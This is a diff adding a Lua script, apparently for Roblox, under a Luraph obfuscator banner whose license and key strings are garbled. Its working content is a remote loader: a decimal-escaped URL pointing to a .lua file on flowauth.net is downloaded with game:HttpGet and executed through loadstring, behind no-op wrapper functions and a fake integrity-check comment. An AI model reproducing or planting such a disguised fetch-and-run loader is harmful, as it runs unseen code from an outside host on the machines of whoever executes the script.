@@ -1,0 +1,34 @@
+--[==[
+    Luraph Obfuscator v15.0.0 (Build 199919)
+    Protected by Luraph (c) 2026
+    Do not redistribute.
+    License: @@199919(@(!!!
+]==]
+
+local a = "\104\116\116\112\115\58\47\47\102\108\111\119\97\117\116\104\46\110\101\116\47\118\49\47\108\111\97\100\101\114\115\47\54\98\48\99\100\56\52\54\48\97\99\48\48\51\54\52\53\51\49\97\100\55\50\55\57\51\50\102\97\97\100\52\46\108\117\97"
+
+local b = {}
+for c = 1, #a do
+    b[#b + 1] = string.char(a:byte(c))
+end
+local d = table.concat(b)
+
+local e = setmetatable({}, {
+    __index = function(g, h) return function(...) return ... end end,
+    __call  = function(g, ...) return ... end,
+})
+
+local f = (function(...) return ... end)(function()
+    return loadstring(game:HttpGet(d))()
+end)
+
+if type(f) == "function" then
+    f()
+end
+
+--[[
+    Luraph v15 Integrity Check: PASS
+    VM State: 0x199919
+    Handler: 0x@@
+    Key: @@199919(@(!!!
+]]
